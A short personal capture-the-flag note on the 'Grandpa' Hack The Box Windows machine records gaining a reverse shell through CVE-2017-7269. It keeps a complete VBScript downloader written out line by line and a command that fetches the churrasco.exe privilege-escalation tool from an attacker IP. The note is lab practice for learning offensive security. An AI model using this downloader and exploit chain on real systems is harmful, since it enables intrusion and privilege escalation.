# Grandpa

Grandpa

Sunday, 6 February 2022

3:49 pm

&#x20;

This is a Windows machine.

The Target IP is 10.10.10.14.

My IP is 10.10.16.5.

&#x20;

This box is meant to be somewhat the same as the Granny box, and I'm gonna use it as practice.

&#x20;

Since it's the similar to the Granny box, the same exploit works.

&#x20;

I got a reverse shell through the use of CVE-2017-7269. This gives me a start to stuff.

&#x20;

!\[\[18\_Grandpa\_image001.png]]

&#x20;

!\[\[18\_Grandpa\_image002.png]]

&#x20;

This gives me some room to work with now. Nmap scan shows the same things as per the other exploit.

&#x20;

This is a useful script that I'll keep here.

&#x20;

echo strUrl = WScript.Arguments.Item(0) > wget.vbs echo StrFile = WScript.Arguments.Item(1) >> wget.vbs echo Const HTTPREQUEST\_PROXYSETTING\_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST\_PROXYSETTING\_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST\_PROXYSETTING\_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST\_PROXYSETTING\_PROXY = 2 >> wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs echo http.Open "GET", strURL, False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs echo strData = "" >> wget.vbs echo strBuffer = "" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs

&#x20;

cscript /nologo wget.vbs [http://10.10.14.147/churrasco.exe](http://10.10.14.147/churrasco.exe) churrasco.exe

&#x20;

VbScript can be used in place of any other types of scripts.

&#x20;
